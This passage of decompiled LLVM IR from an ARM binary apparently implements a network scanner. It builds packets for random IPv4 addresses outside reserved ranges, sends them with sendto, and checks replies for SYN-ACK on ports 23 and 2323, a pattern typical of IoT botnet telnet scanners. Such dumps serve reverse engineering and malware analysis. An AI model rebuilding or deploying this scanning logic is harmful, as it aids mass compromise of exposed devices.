  store i1 %v3_11d08, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_11d08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11d08, label %dec_label_pc_11c68, label %dec_label_pc_11d10

dec_label_pc_11d10:                               ; preds = %dec_label_pc_11d04, %bb290
  %v7_11d10 = icmp eq i32 %v1_11c6c, 198
  %.356 = zext i1 %v7_11d10 to i32
  store i32 %.356, i32* %r3.global-to-local, align 4
  %v2_11d1c = icmp ugt i32 %v1_11c80, 16
  store i1 %v2_11d1c, i1* %cpsr_c.global-to-local, align 1
  %v7_11d1c = icmp eq i32 %v1_11c80, 17
  store i1 %v7_11d1c, i1* %cpsr_z.global-to-local, align 1
  %v2_11d20 = xor i1 %v2_11d1c, true
  %v3_11d20 = or i1 %v7_11d1c, %v2_11d20
  br i1 %v3_11d20, label %.thread23, label %bb293

.thread23:                                        ; preds = %dec_label_pc_11d10
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11d34

bb293:                                            ; preds = %dec_label_pc_11d10
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11d24 = icmp eq i1 %v7_11d10, false
  store i1 %v2_11d24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11d24, label %dec_label_pc_11d34, label %dec_label_pc_11d2c

dec_label_pc_11d2c:                               ; preds = %bb293
  %v2_11d2c = icmp ugt i32 %v1_11c80, 18
  store i1 %v2_11d2c, i1* %cpsr_c.global-to-local, align 1
  %v7_11d2c = icmp eq i32 %v1_11c80, 19
  store i1 %v7_11d2c, i1* %cpsr_z.global-to-local, align 1
  %v2_11d30 = xor i1 %v2_11d2c, true
  %v3_11d30 = or i1 %v7_11d2c, %v2_11d30
  br i1 %v3_11d30, label %dec_label_pc_11c68, label %dec_label_pc_11d34

dec_label_pc_11d34:                               ; preds = %.thread23, %dec_label_pc_11d2c, %bb293
  %v2_11d34 = icmp ugt i32 %v1_11c6c, 222
  store i1 %v2_11d34, i1* %cpsr_c.global-to-local, align 1
  %v7_11d34 = icmp eq i32 %v1_11c6c, 223
  store i1 %v7_11d34, i1* %cpsr_z.global-to-local, align 1
  %v2_11d38 = xor i1 %v7_11d34, true
  %v3_11d38 = and i1 %v2_11d34, %v2_11d38
  br i1 %v3_11d38, label %dec_label_pc_11c68, label %dec_label_pc_11d3c

dec_label_pc_11d3c:                               ; preds = %dec_label_pc_11d34
  %v1_11d3c = add nsw i32 %v1_11c6c, -6
  store i32 %v1_11d3c, i32* %r3.global-to-local, align 4
  %v2_11d40 = icmp ugt i32 %v1_11c6c, 10
  store i1 %v2_11d40, i1* %cpsr_c.global-to-local, align 1
  %v7_11d40 = icmp eq i32 %v1_11c6c, 11
  store i1 %v7_11d40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d40, label %dec_label_pc_11c68, label %bb294

bb294:                                            ; preds = %dec_label_pc_11d3c
  %v3_11d44 = icmp ne i32 %v1_11d3c, 0
  store i1 %v3_11d44, i1* %cpsr_c.global-to-local, align 1
  %v8_11d44 = icmp eq i32 %v1_11d3c, 1
  store i1 %v8_11d44, i1* %cpsr_z.global-to-local, align 1
  %v2_11d48 = xor i1 %v3_11d44, true
  %v3_11d48 = or i1 %v8_11d44, %v2_11d48
  br i1 %v3_11d48, label %dec_label_pc_11c68, label %dec_label_pc_11d4c

dec_label_pc_11d4c:                               ; preds = %bb294
  %v2_11d4c = icmp ugt i32 %v1_11c6c, 21
  store i1 %v2_11d4c, i1* %cpsr_c.global-to-local, align 1
  %v7_11d4c = icmp eq i32 %v1_11c6c, 22
  store i1 %v7_11d4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d4c, label %dec_label_pc_11c68, label %bb295

bb295:                                            ; preds = %dec_label_pc_11d4c
  %v3_11d50 = icmp ugt i32 %v1_11c6c, 20
  store i1 %v3_11d50, i1* %cpsr_c.global-to-local, align 1
  %v8_11d50 = icmp eq i32 %v1_11c6c, 21
  store i1 %v8_11d50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11d50, label %dec_label_pc_11c68, label %dec_label_pc_11d58

dec_label_pc_11d58:                               ; preds = %bb295
  %v2_11d58 = icmp ugt i32 %v1_11c6c, 27
  store i1 %v2_11d58, i1* %cpsr_c.global-to-local, align 1
  %v7_11d58 = icmp eq i32 %v1_11c6c, 28
  store i1 %v7_11d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d58, label %dec_label_pc_11c68, label %bb296

bb296:                                            ; preds = %dec_label_pc_11d58
  %v3_11d5c = icmp ugt i32 %v1_11c6c, 25
  store i1 %v3_11d5c, i1* %cpsr_c.global-to-local, align 1
  %v8_11d5c = icmp eq i32 %v1_11c6c, 26
  store i1 %v8_11d5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11d5c, label %dec_label_pc_11c68, label %dec_label_pc_11d64

dec_label_pc_11d64:                               ; preds = %bb296
  %v2_11d64 = icmp ugt i32 %v1_11c6c, 29
  store i1 %v2_11d64, i1* %cpsr_c.global-to-local, align 1
  %v7_11d64 = icmp eq i32 %v1_11c6c, 30
  store i1 %v7_11d64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d64, label %dec_label_pc_11c68, label %bb297

bb297:                                            ; preds = %dec_label_pc_11d64
  %v3_11d68 = icmp ugt i32 %v1_11c6c, 28
  store i1 %v3_11d68, i1* %cpsr_c.global-to-local, align 1
  %v8_11d68 = icmp eq i32 %v1_11c6c, 29
  store i1 %v8_11d68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11d68, label %dec_label_pc_11c68, label %dec_label_pc_11d70

dec_label_pc_11d70:                               ; preds = %bb297
  %v2_11d70 = icmp ugt i32 %v1_11c6c, 54
  store i1 %v2_11d70, i1* %cpsr_c.global-to-local, align 1
  %v7_11d70 = icmp eq i32 %v1_11c6c, 55
  store i1 %v7_11d70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d70, label %dec_label_pc_11c68, label %bb298

bb298:                                            ; preds = %dec_label_pc_11d70
  %v3_11d74 = icmp ugt i32 %v1_11c6c, 32
  store i1 %v3_11d74, i1* %cpsr_c.global-to-local, align 1
  %v8_11d74 = icmp eq i32 %v1_11c6c, 33
  store i1 %v8_11d74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11d74, label %dec_label_pc_11c68, label %dec_label_pc_11d7c

dec_label_pc_11d7c:                               ; preds = %bb298
  %v2_11d7c = icmp ugt i32 %v1_11c6c, 214
  store i1 %v2_11d7c, i1* %cpsr_c.global-to-local, align 1
  %v7_11d7c = icmp eq i32 %v1_11c6c, 215
  store i1 %v7_11d7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d7c, label %.thread34, label %bb299

bb299:                                            ; preds = %dec_label_pc_11d7c
  %v3_11d80 = icmp ugt i32 %v1_11c6c, 213
  store i1 %v3_11d80, i1* %cpsr_c.global-to-local, align 1
  %v8_11d80 = icmp eq i32 %v1_11c6c, 214
  store i1 %v8_11d80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11d80, label %bb300, label %dec_label_pc_11d90

.thread34:                                        ; preds = %dec_label_pc_11d7c
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11c68

bb300:                                            ; preds = %bb299
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11c68

dec_label_pc_11d90:                               ; preds = %bb299
  store i32 0, i32* @r4, align 4
  %v5_11d9c = call i32 @llvm.bswap.i32(i32 %v0_11c68)
  store i32 %v5_11d9c, i32* %r3.global-to-local, align 4
  %tmp301 = and i32 %v0_11c68, 65280
  %tmp302 = call i32 @llvm.bswap.i32(i32 %tmp301)
  %tmp303 = and i32 %v0_11c68, 16711680
  %tmp304 = call i32 @llvm.bswap.i32(i32 %tmp303)
  %v3_11da8 = mul nuw i32 %v3_11c88, 16777216
  %v3_11dac = udiv i32 %tmp302, 256
  %v4_11db0 = mul nuw nsw i32 %tmp304, 256
  %tmp305 = and i32 %v0_11c68, 32768
  %v3_11db4 = icmp ne i32 %tmp305, 0
  store i1 %v3_11db4, i1* %cpsr_c.global-to-local, align 1
  %v4_11db4 = udiv i32 %v5_11d9c, 16777216
  store i32 ptrtoint (i32* @global_var_1cd14.255 to i32), i32* @r0, align 4
  %v5_11db4 = or i32 %v4_11db4, %v3_11da8
  %v5_11db0 = or i32 %v5_11db4, %v4_11db0
  %v2_11dbc = or i32 %v5_11db0, %v3_11dac
  store i32 %v2_11dbc, i32* %r2.global-to-local, align 4
  %v4_11dc0 = trunc i32 %v4_11db4 to i8
  store i8 %v4_11dc0, i8* @global_var_1cd24.368, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i8 0, i8* bitcast (i32* @global_var_1cd1e.369 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1cd1f.370 to i8*), align 4
  %v2_11dd0 = call i32 @function_f17c(i32 ptrtoint (i32* @global_var_1cd14.255 to i32), i32 20)
  store i32 ptrtoint (i32* @global_var_1cd14.255 to i32), i32* %ip.global-to-local, align 4
  %sext8 = mul i32 %v2_11dd0, 16777216
  %v1_11dd8 = sdiv i32 %sext8, 16777216
  store i32 %v1_11dd8, i32* %r3.global-to-local, align 4
  %v4_11ddc = ashr i32 %sext8, 31
  store i32 %v4_11ddc, i32* %r2.global-to-local, align 4
  %v1_11de0 = trunc i32 %v1_11dd8 to i8
  store i8 %v1_11de0, i8* bitcast (i32* @global_var_1cd1e.369 to i8*), align 4
  %v1_11de4 = trunc i32 %v4_11ddc to i8
  store i8 %v1_11de4, i8* bitcast (i32* @global_var_1cd1f.370 to i8*), align 4
  %v3_11de8 = load i32, i32* %stack_var_-52, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_11df0 = srem i32 %v3_11de8, 10
  store i32 %v2_11df0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11df4 = icmp eq i32 %v2_11df0, 0
  store i1 %v2_11df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11df4, label %.thread199, label %bb306

.thread199:                                       ; preds = %dec_label_pc_11d90
  store i32 ptrtoint (i32* @global_var_1cd28.259 to i32), i32* @lr, align 4
  br label %.thread44.thread75

bb306:                                            ; preds = %dec_label_pc_11d90
  store i32 ptrtoint (i32* @global_var_1cd28.259 to i32), i32* %r0.global-to-local, align 4
  store i32 23, i32* %r3.global-to-local, align 4
  %v1_11e04 = load i32, i32* @r4, align 4
  %v2_11e04 = trunc i32 %v1_11e04 to i8
  store i8 %v2_11e04, i8* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1cd28.259 to i32), i32 2) to i8*), align 2
  %v0_11e08.pr.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e08.pr.pre, label %.thread44.thread75, label %.thread41

.thread41:                                        ; preds = %bb306
  %v1_11e08 = load i32, i32* %r3.global-to-local, align 4
  %v2_11e08 = trunc i32 %v1_11e08 to i8
  %v3_11e08 = load i32, i32* %r0.global-to-local, align 4
  %v4_11e08 = add i32 %v3_11e08, 3
  %v5_11e08 = inttoptr i32 %v4_11e08 to i8*
  store i8 %v2_11e08, i8* %v5_11e08, align 1
  %v0_11e10.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1cd14.255 to i32), i32* %r0.global-to-local, align 4
  br i1 %v0_11e10.pr.pr, label %.thread47, label %.thread49

.thread44.thread75:                               ; preds = %bb306, %.thread199
  store i32 ptrtoint (i32* @global_var_1cd14.255 to i32), i32* %r0.global-to-local, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread41, %.thread44.thread75
  store i32 9, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v3_11e18 = load i32, i32* @lr, align 4
  %v4_11e18 = add i32 %v3_11e18, 2
  %v5_11e18 = inttoptr i32 %v4_11e18 to i8*
  store i8 9, i8* %v5_11e18, align 1
  %v0_11e1c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e1c.pr.pr, label %bb307, label %.thread49

bb307:                                            ; preds = %.thread47
  %v1_11e1c = load i32, i32* %r2.global-to-local, align 4
  %v2_11e1c = trunc i32 %v1_11e1c to i8
  %v3_11e1c = load i32, i32* @lr, align 4
  %v4_11e1c = add i32 %v3_11e1c, 3
  %v5_11e1c = inttoptr i32 %v4_11e1c to i8*
  store i8 %v2_11e1c, i8* %v5_11e1c, align 1
  br label %.thread49

.thread49:                                        ; preds = %.thread41, %.thread47, %bb307
  %v3_11e20 = load i8, i8* @global_var_1cd24.368, align 1
  %v4_11e20 = sext i8 %v3_11e20 to i32
  store i32 %v4_11e20, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd28.259 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd28.259 to i32), i32* @r1, align 4
  store i8 %v3_11e20, i8* @global_var_1cd2c.371, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_11e38 = load i32, i32* %sl.global-to-local, align 4
  %v1_11e38 = trunc i32 %v0_11e38 to i8
  store i8 %v1_11e38, i8* bitcast (i32* @global_var_1cd38.372 to i8*), align 4
  store i8 %v1_11e38, i8* bitcast (i32* @global_var_1cd39.373 to i8*), align 4
  %v4_11e40 = call i32 @function_f1d8(i32 ptrtoint (i32* @global_var_1cd14.255 to i32), i32 ptrtoint (i32* @global_var_1cd28.259 to i32), i32 5120, i32 20)
  %sext = mul i32 %v4_11e40, 16777216
  %v1_11e48 = sdiv i32 %sext, 16777216
  %v3_11e50 = ashr i32 %sext, 31
  %v2_11e54 = load i32, i32* @global_var_1cd28.259, align 4
  %v1_11e5c = trunc i32 %v3_11e50 to i8
  store i8 %v1_11e5c, i8* bitcast (i32* @global_var_1cd39.373 to i8*), align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_11e70 = load i8, i8* @global_var_1cd24.368, align 1
  %v4_11e70 = sext i8 %v3_11e70 to i32
  store i32 %v4_11e70, i32* %r4.global-to-local, align 4
  %v2_11e74 = load i32, i32* @global_var_1cd68.253, align 4
  store i32 %v2_11e74, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd28.259 to i32), i32* %ip.global-to-local, align 4
  %v1_11e84 = and i32 %v2_11e54, 8388608
  %v2_11e84 = icmp ne i32 %v1_11e84, 0
  store i1 %v2_11e84, i1* %cpsr_c.global-to-local, align 1
  %v1_11e8c = trunc i32 %v1_11e48 to i8
  store i8 %v1_11e8c, i8* bitcast (i32* @global_var_1cd38.372 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1cd14.255 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_11ea0, i32* %lr.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v9_11eb4 = call i32 @sendto(i32 %v2_11e74, i32* nonnull @global_var_1cd14.255, i32 40, i32 16384, %sockaddr* %tmp279, i32 16)
  store i32 %v9_11eb4, i32* %r0.global-to-local, align 4
  %v3_11eb8 = load i32, i32* %stack_var_-52, align 4
  %v1_11ebc = add i32 %v3_11eb8, 1
  store i32 %v1_11ebc, i32* %r3.global-to-local, align 4
  %v2_11ec0 = icmp ugt i32 %v1_11ebc, 158
  store i1 %v2_11ec0, i1* %cpsr_c.global-to-local, align 1
  %v7_11ec0 = icmp eq i32 %v1_11ebc, 159
  store i1 %v7_11ec0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_11ebc, i32* %stack_var_-52, align 4
  %v7_11ec8 = icmp slt i32 %v1_11ebc, 160
  br i1 %v7_11ec8, label %.thread49.dec_label_pc_11c38_crit_edge, label %dec_label_pc_11ecc

.thread49.dec_label_pc_11c38_crit_edge:           ; preds = %.thread49
  %v0_11c38.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11c38

dec_label_pc_11ecc:                               ; preds = %.thread49
  %v0_11ecc = load i32, i32* @r8, align 4
  br label %dec_label_pc_11ed0

dec_label_pc_11ed0:                               ; preds = %dec_label_pc_11c18, %dec_label_pc_11ecc
  %stack_var_-1872.1 = phi i32 [ %stack_var_-1872.0, %dec_label_pc_11c18 ], [ %v0_11ecc, %dec_label_pc_11ecc ]
  %v0_11ed0 = call i32* @__errno_location()
  %v2_11ed0 = ptrtoint i32* %v0_11ed0 to i32
  store i32 %v2_11ed0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11edc

dec_label_pc_11edc:                               ; preds = %dec_label_pc_11fbc, %dec_label_pc_11fb4, %dec_label_pc_11fac, %dec_label_pc_11f7c, %dec_label_pc_11f6c, %dec_label_pc_11f48, %dec_label_pc_11f30, %dec_label_pc_11fa4, %dec_label_pc_11f98, %dec_label_pc_11f28, %dec_label_pc_1205c, %dec_label_pc_11ed0
  store i32 0, i32* %v0_11ed0, align 4
  %v2_11eec = load i32, i32* @global_var_1cd68.253, align 4
  store i32 %v2_11eec, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_11c08, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v10_11f0c = call i32 @recvfrom(i32 %v2_11eec, i32* nonnull %stack_var_-1862, i32 1514, i32 16384, %sockaddr* null, i32* null)
  store i32 %v10_11f0c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11f10 = icmp eq i32 %v10_11f0c, 0
  store i1 %v2_11f10, i1* %cpsr_z.global-to-local, align 1
  %tmp308 = icmp slt i32 %v10_11f0c, 1
  br i1 %tmp308, label %dec_label_pc_12090, label %dec_label_pc_11f18

dec_label_pc_11f18:                               ; preds = %dec_label_pc_11edc
  store i32 %v2_11ed0, i32* %lr.global-to-local, align 4
  %v2_11f1c = load i32, i32* %v0_11ed0, align 4
  store i32 %v2_11f1c, i32* %r3.global-to-local, align 4
  %v2_11f20 = icmp ugt i32 %v2_11f1c, 10
  store i1 %v2_11f20, i1* %cpsr_c.global-to-local, align 1
  %v7_11f20 = icmp eq i32 %v2_11f1c, 11
  store i1 %v7_11f20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f20, label %dec_label_pc_12090, label %dec_label_pc_11f28

dec_label_pc_11f28:                               ; preds = %dec_label_pc_11f18
  %v2_11f28 = icmp ugt i32 %v10_11f0c, 38
  store i1 %v2_11f28, i1* %cpsr_c.global-to-local, align 1
  %v7_11f28 = icmp eq i32 %v10_11f0c, 39
  store i1 %v7_11f28, i1* %cpsr_z.global-to-local, align 1
  %v2_11f2c = xor i1 %v2_11f28, true
  %v3_11f2c = or i1 %v7_11f28, %v2_11f2c
  br i1 %v3_11f2c, label %dec_label_pc_11edc, label %dec_label_pc_11f30

dec_label_pc_11f30:                               ; preds = %dec_label_pc_11f28
  store i32 %v2_11c08, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd48.140 to i32), i32* %r1.global-to-local, align 4
  %v3_11f38 = load i32, i32* %v2_11f38, align 4
  store i32 %v3_11f38, i32* %r2.global-to-local, align 4
  %v2_11f3c = load i32, i32* @global_var_1cd48.140, align 4
  store i32 %v2_11f3c, i32* %r3.global-to-local, align 4
  %v3_11f40 = icmp uge i32 %v3_11f38, %v2_11f3c
  store i1 %v3_11f40, i1* %cpsr_c.global-to-local, align 1
  %v9_11f40 = icmp eq i32 %v3_11f38, %v2_11f3c
  store i1 %v9_11f40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11f40, label %dec_label_pc_11f48, label %dec_label_pc_11edc

dec_label_pc_11f48:                               ; preds = %dec_label_pc_11f30
  %v3_11f48 = load i8, i8* %v2_11f48, align 1
  %v4_11f48 = zext i8 %v3_11f48 to i32
  store i32 %v4_11f48, i32* %r3.global-to-local, align 4
  %v2_11f4c = icmp ugt i8 %v3_11f48, 5
  store i1 %v2_11f4c, i1* %cpsr_c.global-to-local, align 1
  %v7_11f4c = icmp eq i8 %v3_11f48, 6
  store i1 %v7_11f4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f4c, label %dec_label_pc_11f54, label %dec_label_pc_11edc

dec_label_pc_11f54:                               ; preds = %dec_label_pc_11f48
  store i32 %v2_11c0c, i32* %r3.global-to-local, align 4
  %v2_11f58 = load i8, i8* %tmp278, align 4
  %v3_11f58 = zext i8 %v2_11f58 to i32
  store i32 %v3_11f58, i32* %r2.global-to-local, align 4
  %v3_11f5c = load i8, i8* %v2_11f5c, align 1
  %v4_11f5c = zext i8 %v3_11f5c to i32
  store i32 %v4_11f5c, i32* %r3.global-to-local, align 4
  %v4_11f60 = mul nuw nsw i32 %v4_11f5c, 256
  %v5_11f60 = or i32 %v4_11f60, %v3_11f58
  store i32 %v5_11f60, i32* %r2.global-to-local, align 4
  %v2_11f64 = icmp ugt i32 %v5_11f60, 5887
  store i1 %v2_11f64, i1* %cpsr_c.global-to-local, align 1
  %v7_11f64 = icmp eq i32 %v5_11f60, 5888
  store i1 %v7_11f64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f64, label %dec_label_pc_11f7c, label %dec_label_pc_11f6c

dec_label_pc_11f6c:                               ; preds = %dec_label_pc_11f54
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_11f74 = icmp ugt i32 %v5_11f60, 4872
  store i1 %v3_11f74, i1* %cpsr_c.global-to-local, align 1
  %v9_11f74 = icmp eq i32 %v5_11f60, 4873
  store i1 %v9_11f74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11f74, label %dec_label_pc_11f7c, label %dec_label_pc_11edc

dec_label_pc_11f7c:                               ; preds = %dec_label_pc_11f6c, %dec_label_pc_11f54
  store i32 %v2_11c0c, i32* %ip.global-to-local, align 4
  %v3_11f80 = load i8, i8* %v2_11f80, align 2
  %v4_11f80 = zext i8 %v3_11f80 to i32
  store i32 %v4_11f80, i32* %r3.global-to-local, align 4
  %v3_11f84 = load i8, i8* %v2_11f84, align 1
  %v4_11f84 = zext i8 %v3_11f84 to i32
  store i32 %v4_11f84, i32* %r2.global-to-local, align 4
  store i32 %v4_117ac, i32* %lr.global-to-local, align 4
  %v4_11f8c = mul nuw nsw i32 %v4_11f84, 256
  %v5_11f8c = or i32 %v4_11f8c, %v4_11f80
  store i32 %v5_11f8c, i32* %r3.global-to-local, align 4
  %v3_11f90 = icmp uge i32 %v5_11f8c, %v4_117ac
  store i1 %v3_11f90, i1* %cpsr_c.global-to-local, align 1
  %v9_11f90 = icmp eq i32 %v5_11f8c, %v4_117ac
  store i1 %v9_11f90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11f90, label %dec_label_pc_11f98, label %dec_label_pc_11edc

dec_label_pc_11f98:                               ; preds = %dec_label_pc_11f7c
  %v3_11f98 = load i8, i8* %v2_11f98, align 1
  %v4_11f98 = zext i8 %v3_11f98 to i32
  store i32 %v4_11f98, i32* %r3.global-to-local, align 4
  %v1_11f9c = and i32 %v4_11f98, 2
  %v2_11f9c = icmp eq i32 %v1_11f9c, 0
  store i1 %v2_11f9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11f9c, label %dec_label_pc_11edc, label %dec_label_pc_11fa4

dec_label_pc_11fa4:                               ; preds = %dec_label_pc_11f98
  %v1_11fa4 = and i32 %v4_11f98, 16
  %v2_11fa4 = icmp eq i32 %v1_11fa4, 0
  store i1 %v2_11fa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11fa4, label %dec_label_pc_11edc, label %dec_label_pc_11fac

dec_label_pc_11fac:                               ; preds = %dec_label_pc_11fa4
  %v1_11fac = and i32 %v4_11f98, 4
  %v2_11fac = icmp eq i32 %v1_11fac, 0
  store i1 %v2_11fac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11fac, label %dec_label_pc_11fb4, label %dec_label_pc_11edc

dec_label_pc_11fb4:                               ; preds = %dec_label_pc_11fac
  %tmp459 = urem i8 %v3_11f98, 2
  %v2_11fb4 = icmp eq i8 %tmp459, 0
  store i1 %v2_11fb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11fb4, label %dec_label_pc_11fbc, label %dec_label_pc_11edc

dec_label_pc_11fbc:                               ; preds = %dec_label_pc_11fb4
  %v3_11fbc = load i32, i32* %v2_11fbc, align 4
  %v2_11fd8 = call i32 @llvm.bswap.i32(i32 %v3_11fbc)
  %v1_11fdc = add i32 %v2_11fd8, -1
  %v1_11fe0 = udiv i32 %v1_11fdc, 256
  %v3_11fe4 = and i32 %v1_11fe0, 65280
  %v1_11fe8 = and i32 %v1_11fdc, 65280
  store i32 %v1_11fe8, i32* %r2.global-to-local, align 4
  %v3_11fec = mul i32 %v1_11fdc, 16777216
  %v4_11ff0 = udiv i32 %v1_11fdc, 16777216
  %v5_11ff0 = or i32 %v3_11fe4, %v4_11ff0
  store i32 %v5_11ff0, i32* %r1.global-to-local, align 4
  store i32 %v2_11c08, i32* %r3.global-to-local, align 4
  %v4_11ff8 = mul nuw nsw i32 %v1_11fe8, 256
  %v5_11ff8 = or i32 %v4_11ff8, %v3_11fec
  store i32 %v5_11ff8, i32* %r0.global-to-local, align 4
  %v3_11ffc = load i32, i32* %v2_11ffc, align 4
  store i32 %v3_11ffc, i32* %r2.global-to-local, align 4
  %v2_12000 = call i32 @llvm.bswap.i32(i32 %v1_11fdc)
  store i32 %v2_12000, i32* %ip.global-to-local, align 4
  %v3_12004 = icmp uge i32 %v2_12000, %v3_11ffc
  store i1 %v3_12004, i1* %cpsr_c.global-to-local, align 1
  %v9_12004 = icmp eq i32 %v2_12000, %v3_11ffc
  store i1 %v9_12004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12004, label %dec_label_pc_1200c, label %dec_label_pc_11edc

dec_label_pc_1200c:                               ; preds = %dec_label_pc_11fbc
  %v0_1200c = load i32, i32* @r4, align 4
  %v2_1200c = icmp ugt i32 %v0_1200c, 126
  store i1 %v2_1200c, i1* %cpsr_c.global-to-local, align 1
  %v7_1200c = icmp eq i32 %v0_1200c, 127
  store i1 %v7_1200c, i1* %cpsr_z.global-to-local, align 1
  %v8_12010 = icmp sgt i32 %v0_1200c, 127
  br i1 %v8_12010, label %dec_label_pc_12090, label %dec_label_pc_12014

dec_label_pc_12014:                               ; preds = %dec_label_pc_1200c
  store i32 ptrtoint (i32* @global_var_1cd64.251 to i32), i32* %lr.global-to-local, align 4
  %v3_12018 = mul i32 %v0_1200c, 256
  store i32 %v3_12018, i32* %r2.global-to-local, align 4
  %v2_1201c = load i32, i32* @global_var_1cd64.251, align 4
  store i32 %v2_1201c, i32* %r1.global-to-local, align 4
  %v2_12024 = mul i32 %v0_1200c, 288
  store i32 %v2_12024, i32* %r3.global-to-local, align 4
  %v2_12028 = add i32 %v2_1201c, %v2_12024
  store i32 %v2_12028, i32* @r0, align 4
  %v1_1202c = add i32 %v2_12028, 12
  %v2_1202c = inttoptr i32 %v1_1202c to i32*
  %v3_1202c = load i32, i32* %v2_1202c, align 4
  store i32 %v3_1202c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12030 = icmp eq i32 %v3_1202c, 0
  store i1 %v2_12030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12030, label %dec_label_pc_1205c, label %dec_label_pc_1203c.preheader

dec_label_pc_1203c.preheader:                     ; preds = %dec_label_pc_12014
  %v2_12034 = add i32 %v2_12028, 288
  store i32 %v2_12034, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1203c

dec_label_pc_1203c:                               ; preds = %dec_label_pc_1203c.preheader, %dec_label_pc_12048
  %v0_12048 = phi i32 [ %v2_12034, %dec_label_pc_1203c.preheader ], [ %v1_12054, %dec_label_pc_12048 ]
  %v0_1203c = phi i32 [ %v0_1200c, %dec_label_pc_1203c.preheader ], [ %v1_1203c, %dec_label_pc_12048 ]
  %v1_1203c = add i32 %v0_1203c, 1
  store i32 %v1_1203c, i32* @r4, align 4
  %v7_12040 = icmp eq i32 %v1_1203c, 128
  br i1 %v7_12040, label %dec_label_pc_12090.loopexit, label %dec_label_pc_12048

dec_label_pc_12048:                               ; preds = %dec_label_pc_1203c
  store i32 %v0_12048, i32* @r0, align 4
  %v1_1204c = add i32 %v0_12048, 12
  %v2_1204c = inttoptr i32 %v1_1204c to i32*
  %v3_1204c = load i32, i32* %v2_1204c, align 4
  %v2_12050 = icmp eq i32 %v3_1204c, 0
  %v1_12054 = add i32 %v0_12048, 288
  store i32 %v1_12054, i32* %r3.global-to-local, align 4
  br i1 %v2_12050, label %dec_label_pc_1205c.loopexit, label %dec_label_pc_1203c

dec_label_pc_1205c.loopexit:                      ; preds = %dec_label_pc_12048
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1205c

dec_label_pc_1205c:                               ; preds = %dec_label_pc_1205c.loopexit, %dec_label_pc_12014
  %v1_1205c = phi i32 [ %v0_12048, %dec_label_pc_1205c.loopexit ], [ %v2_12028, %dec_label_pc_12014 ]
  %v2_1205c = add i32 %v1_1205c, 16
  %v3_1205c = inttoptr i32 %v2_1205c to i32*
  store i32 %v3_11ffc, i32* %v3_1205c, align 4
  store i32 %v2_11c0c, i32* %r1.global-to-local, align 4
  %v2_12064 = load i32, i32* %stack_var_-1842, align 4
